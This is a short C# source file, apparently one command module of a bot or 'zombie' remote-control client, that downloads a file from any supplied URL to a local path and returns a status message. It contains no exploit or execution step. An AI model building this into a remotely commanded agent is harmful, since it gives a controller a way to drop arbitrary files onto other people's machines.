using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Zombie.Functions
{
    static class Download
    {

        public static byte[] FromURL(string url, string fileName)
        {

            string result = "Download completed successfully.";

            using (var client = new WebClient())
            {
                if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(fileName))
                {
                    result = "No URL or File Name specified.";
                    return GenericCommandResult.Generate(result);
                }
                try
                {
                    client.DownloadFile(url, fileName);
                }
                catch (NotSupportedException)
                {
                    result = "Incorrect URL format.";
                }
                catch (WebException)
                {
                    result = "No file found at specified link.";
                }
            }

            return GenericCommandResult.Generate(result);
        }

    }
}
